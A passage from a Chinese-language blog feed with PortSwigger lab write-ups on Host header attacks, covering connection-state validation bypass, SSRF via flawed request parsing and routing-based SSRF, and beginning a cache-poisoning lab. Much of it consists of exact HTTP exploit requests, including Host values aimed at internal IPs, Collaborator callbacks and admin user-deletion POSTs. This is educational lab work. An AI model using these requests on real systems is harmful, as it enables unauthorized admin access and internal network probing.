&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span> &lt;span style="color:#ae81ff">200&lt;/span> &lt;span style="color:#a6e22e">OK&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>点击上方&lt;code>Go to exploit server&lt;/code>、&lt;code>Access log&lt;/code>可以查看到&lt;code>carlos&lt;/code>密码
&lt;img alt="Access log" src="/img/2024/host-header-attack-lab-host-header-password-reset-poisoning-via-dangling-markup-8.jpg">&lt;/li>
&lt;li>使用&lt;code>carlos&lt;/code>与上述重置后的密码登录后即可解题&lt;/li>
&lt;/ol></content></item><item><title>[Write Up]Lab: Host validation bypass via connection state attack</title><link>/portswigger-posts/host-header-attack-lab-host-header-host-validation-bypass-via-connection-state-attack/</link><pubDate>Tue, 24 Dec 2024 22:52:26 +0800</pubDate><guid>/portswigger-posts/host-header-attack-lab-host-header-host-validation-bypass-via-connection-state-attack/</guid><description>&lt;h2 id="lab-description">Lab description&lt;/h2>
&lt;p>&lt;img alt="Lab description" src="/img/2024/host-header-attack-lab-host-header-host-validation-bypass-via-connection-state-attack-1.jpg">&lt;/p></description><content>&lt;h2 id="lab-description">Lab description&lt;/h2>
&lt;p>&lt;img alt="Lab description" src="/img/2024/host-header-attack-lab-host-header-host-validation-bypass-via-connection-state-attack-1.jpg">&lt;/p>
&lt;h2 id="solution">Solution&lt;/h2>
&lt;ol>
&lt;li>尝试使用&lt;code>/admin&lt;/code>、&lt;code>192.168.0.1&lt;/code>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">GET&lt;/span> /admin &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">1.1&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Host&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">192.168.0.1&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">1.1&lt;/span> &lt;span style="color:#ae81ff">403&lt;/span> &lt;span style="color:#a6e22e">Forbidden&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>在Burp Repeater分页点击右键、&lt;code>Add tab to group&lt;/code>、&lt;code>Create tab group&lt;/code>，并将原本的分页加入group，请求如下
&lt;img alt="Tab group" src="/img/2024/host-header-attack-lab-host-header-host-validation-bypass-via-connection-state-attack-2.jpg">
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">GET&lt;/span> / &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">1.1&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Host&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">0ae100d7040562ed8135392700a6005b.h1-web-security-academy.net&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Connection&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">keep-alive&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>选择原本的分页点击右键、&lt;code>Duplicate tab&lt;/code>，将请求修改如下
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">GET&lt;/span> /admin &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">1.1&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Host&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">192.168.0.1&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>修改请求发送模式为&lt;code>Send group in sequence (single connection)&lt;/code>，并发送请求序列，第二个tab的返回为
&lt;img alt="Send mode" src="/img/2024/host-header-attack-lab-host-header-host-validation-bypass-via-connection-state-attack-3.jpg">
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">1.1&lt;/span> &lt;span style="color:#ae81ff">200&lt;/span> &lt;span style="color:#a6e22e">OK&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;lt;form style=&amp;#39;margin-top: 1em&amp;#39; class=&amp;#39;login-form&amp;#39; action=&amp;#39;/admin/delete&amp;#39; method=&amp;#39;POST&amp;#39;&amp;gt;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;lt;input required type=&amp;#34;hidden&amp;#34; name=&amp;#34;csrf&amp;#34; value=&amp;#34;doLsmDgX8pDrr84pLwuQ68V98cQoYGpq&amp;#34;&amp;gt;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;lt;label&amp;gt;Username&amp;lt;/label&amp;gt;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;lt;input required type=&amp;#39;text&amp;#39; name=&amp;#39;username&amp;#39;&amp;gt;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;lt;button class=&amp;#39;button&amp;#39; type=&amp;#39;submit&amp;#39;&amp;gt;Delete user&amp;lt;/button&amp;gt;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;lt;/form&amp;gt;
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>参考上述返回，修改第二个tab的请求，发送请求后即可解题
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">POST&lt;/span> /admin/delete &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">1.1&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Host&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">192.168.0.1&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>csrf=doLsmDgX8pDrr84pLwuQ68V98cQoYGpq&amp;amp;username=carlos
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">1.1&lt;/span> &lt;span style="color:#ae81ff">302&lt;/span> &lt;span style="color:#a6e22e">Found&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;/ol></content></item><item><title>[Write Up]Lab: SSRF via flawed request parsing</title><link>/portswigger-posts/host-header-attack-lab-host-header-ssrf-via-flawed-request-parsing/</link><pubDate>Tue, 24 Dec 2024 22:22:14 +0800</pubDate><guid>/portswigger-posts/host-header-attack-lab-host-header-ssrf-via-flawed-request-parsing/</guid><description>&lt;h2 id="lab-description">Lab description&lt;/h2>
&lt;p>&lt;img alt="Lab description" src="/img/2024/host-header-attack-lab-host-header-ssrf-via-flawed-request-parsing-1.jpg">&lt;/p></description><content>&lt;h2 id="lab-description">Lab description&lt;/h2>
&lt;p>&lt;img alt="Lab description" src="/img/2024/host-header-attack-lab-host-header-ssrf-via-flawed-request-parsing-1.jpg">&lt;/p>
&lt;h2 id="solution">Solution&lt;/h2>
&lt;ol>
&lt;li>点击Burp Collaborator中的&lt;code>Copy to clipboard&lt;/code>，并修改首页请求
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">GET&lt;/span> / &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Host&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">w41el7hll9h1f0wkpaxy7qjeq5wxkn8c.oastify.com&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span> &lt;span style="color:#ae81ff">403&lt;/span> &lt;span style="color:#a6e22e">Forbidden&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>尝试使用绝对路径请求
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">GET&lt;/span> https://0aa4007c03d98b54818684f2003e00bb.web-security-academy.net &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Host&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">gk4y1rx51txlvkc45udinazy6pch08ox.oastify.com&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span> &lt;span style="color:#ae81ff">200&lt;/span> &lt;span style="color:#a6e22e">OK&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>在Burp Collaborator页面可以发现有对应的DNS请求记录，可以确认网站的中间件会向任意服务器发出请求
&lt;img alt="Burp Collaborator" src="/img/2024/host-header-attack-lab-host-header-ssrf-via-flawed-request-parsing-2.jpg">&lt;/li>
&lt;li>使用Burp Intruder进行&lt;code>192.168.0.0/24&lt;/code>遍历，请求与Payload如下，记得反选Update Host header to match target
&lt;img alt="Burp Intruder" src="/img/2024/host-header-attack-lab-host-header-ssrf-via-flawed-request-parsing-3.jpg">&lt;/li>
&lt;li>根据扫描结果&lt;code>192.168.0.102&lt;/code>会跳转至&lt;code>/admin&lt;/code>，发送请求
&lt;img alt="Burp Intruder" src="/img/2024/host-header-attack-lab-host-header-ssrf-via-flawed-request-parsing-4.jpg">
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">GET&lt;/span> https://0aa4007c03d98b54818684f2003e00bb.web-security-academy.net/admin &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Host&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">192.168.0.102&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span> &lt;span style="color:#ae81ff">200&lt;/span> &lt;span style="color:#a6e22e">OK&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;lt;form style=&amp;#39;margin-top: 1em&amp;#39; class=&amp;#39;login-form&amp;#39; action=&amp;#39;/admin/delete&amp;#39; method=&amp;#39;POST&amp;#39;&amp;gt;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;lt;input required type=&amp;#34;hidden&amp;#34; name=&amp;#34;csrf&amp;#34; value=&amp;#34;vDi8dR8n51eHQdfTlYMGnZMeE4kyqV3Y&amp;#34;&amp;gt;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;lt;label&amp;gt;Username&amp;lt;/label&amp;gt;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;lt;input required type=&amp;#39;text&amp;#39; name=&amp;#39;username&amp;#39;&amp;gt;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;lt;button class=&amp;#39;button&amp;#39; type=&amp;#39;submit&amp;#39;&amp;gt;Delete user&amp;lt;/button&amp;gt;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;lt;/form&amp;gt;
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>根据上述结果修改请求&lt;code>POST /admin/delete&lt;/code>、&lt;code>csrf&lt;/code>，并新增&lt;code>username&lt;/code>参数，发送请求后即可解题
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">POST&lt;/span> https://0aa4007c03d98b54818684f2003e00bb.web-security-academy.net/admin/delete &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Host&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">192.168.0.102&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>csrf=vDi8dR8n51eHQdfTlYMGnZMeE4kyqV3Y&amp;amp;username=carlos
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span> &lt;span style="color:#ae81ff">302&lt;/span> &lt;span style="color:#a6e22e">Found&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;/ol></content></item><item><title>[Write Up]Lab: Routing-based SSRF</title><link>/portswigger-posts/host-header-attack-lab-host-header-routing-based-ssrf/</link><pubDate>Mon, 23 Dec 2024 22:12:47 +0800</pubDate><guid>/portswigger-posts/host-header-attack-lab-host-header-routing-based-ssrf/</guid><description>&lt;h2 id="lab-description">Lab description&lt;/h2>
&lt;p>&lt;img alt="Lab description" src="/img/2024/host-header-attack-lab-host-header-routing-based-ssrf-1.jpg">&lt;/p></description><content>&lt;h2 id="lab-description">Lab description&lt;/h2>
&lt;p>&lt;img alt="Lab description" src="/img/2024/host-header-attack-lab-host-header-routing-based-ssrf-1.jpg">&lt;/p>
&lt;h2 id="solution">Solution&lt;/h2>
&lt;ol>
&lt;li>点击Burp Collaborator中的&lt;code>Copy to clipboard&lt;/code>，并修改首页请求
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">GET&lt;/span> / &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Host&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">qwq8d19fd39v7uoeh4pszkb8izoqch06.oastify.com&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span> &lt;span style="color:#ae81ff">200&lt;/span> &lt;span style="color:#a6e22e">OK&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;lt;html&amp;gt;&amp;lt;body&amp;gt;a9lo6wgokqr9cli0g2k4gzzjjgjgz&amp;lt;/body&amp;gt;&amp;lt;/html&amp;gt;
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>在Burp Collaborator页面可以发现有对应的DNS请求记录，可以确认网站的中间件会向任意服务器发出请求
&lt;img alt="Burp Collaborator" src="/img/2024/host-header-attack-lab-host-header-routing-based-ssrf-2.jpg">&lt;/li>
&lt;li>使用Burp Intruder进行&lt;code>192.168.0.0/24&lt;/code>遍历，请求与Payload如下，记得反选&lt;code>Update Host header to match target&lt;/code>
&lt;img alt="Burp Intruder" src="/img/2024/host-header-attack-lab-host-header-routing-based-ssrf-3.jpg">&lt;/li>
&lt;li>根据扫描结果&lt;code>192.168.0.80&lt;/code>会跳转至&lt;code>/admin&lt;/code>，发送请求
&lt;img alt="Burp Intruder" src="/img/2024/host-header-attack-lab-host-header-routing-based-ssrf-4.jpg">
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">GET&lt;/span> /admin &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Host&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">192.168.0.80&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span> &lt;span style="color:#ae81ff">200&lt;/span> &lt;span style="color:#a6e22e">OK&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;lt;form style=&amp;#39;margin-top: 1em&amp;#39; class=&amp;#39;login-form&amp;#39; action=&amp;#39;/admin/delete&amp;#39; method=&amp;#39;POST&amp;#39;&amp;gt;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;lt;input required type=&amp;#34;hidden&amp;#34; name=&amp;#34;csrf&amp;#34; value=&amp;#34;V8RJDPbUlulIWZ60TFq6Avo5Q65ueWk5&amp;#34;&amp;gt;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;lt;label&amp;gt;Username&amp;lt;/label&amp;gt;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;lt;input required type=&amp;#39;text&amp;#39; name=&amp;#39;username&amp;#39;&amp;gt;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;lt;button class=&amp;#39;button&amp;#39; type=&amp;#39;submit&amp;#39;&amp;gt;Delete user&amp;lt;/button&amp;gt;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;lt;/form&amp;gt;
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>根据上述结果修改请求&lt;code>POST /admin/delete&lt;/code>、&lt;code>csrf&lt;/code>，并新增&lt;code>username&lt;/code>参数，发送请求后即可解题
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">POST&lt;/span> /admin/delete &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Host&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">192.168.0.80&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>csrf=V8RJDPbUlulIWZ60TFq6Avo5Q65ueWk5&amp;amp;username=carlos
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span> &lt;span style="color:#ae81ff">302&lt;/span> &lt;span style="color:#a6e22e">Found&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;/ol></content></item><item><title>[Write Up]Lab: Web cache poisoning via ambiguous requests</title><link>/portswigger-posts/host-header-attack-lab-host-header-web-cache-poisoning-via-ambiguous-requests/</link><pubDate>Mon, 23 Dec 2024 10:16:19 +0800</pubDate><guid>/portswigger-posts/host-header-attack-lab-host-header-web-cache-poisoning-via-ambiguous-requests/</guid><description>&lt;h2 id="lab-description">Lab description&lt;/h2>
&lt;p>&lt;img alt="Lab description" src="/img/2024/host-header-attack-lab-host-header-web-cache-poisoning-via-ambiguous-requests-1.jpg">&lt;/p></description><content>&lt;h2 id="lab-description">Lab description&lt;/h2>
&lt;p>&lt;img alt="Lab description" src="/img/2024/host-header-attack-lab-host-header-web-cache-poisoning-via-ambiguous-requests-1.jpg">&lt;/p>
&lt;h2 id="solution">Solution&lt;/h2>
&lt;ol>
&lt;li>主页中点击任一商品&lt;code>View details&lt;/code>，会有以下请求序列
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">GET&lt;/span> /product?productId=1 &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">1.1&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Host&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">0a4a00160450455f8172532c00720096.h1-web-security-academy.net&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">1.1&lt;/span> &lt;span style="color:#ae81ff">200&lt;/span> &lt;span style="color:#a6e22e">OK&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>X-Cache&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">miss&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">GET&lt;/span> /resources/js/tracking.js &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">1.1&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Host&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">0a4a00160450455f8172532c00720096.h1-web-security-academy.net&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">1.1&lt;/span> &lt;span style="color:#ae81ff">200&lt;/span> &lt;span style="color:#a6e22e">OK&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>document.write(&amp;#39;&amp;lt;img src=&amp;#34;/resources/images/tracker.gif?page=post&amp;#34;&amp;gt;&amp;#39;);
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>再次刷新页面出现以下请求
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">GET&lt;/span> /product?productId=1 &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">1.1&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Host&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">0a4a00160450455f8172532c00720096.h1-web-security-academy.net&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">1.1&lt;/span> &lt;span style="color:#ae81ff">200&lt;/span> &lt;span style="color:#a6e22e">OK&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>X-Cache: hit
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
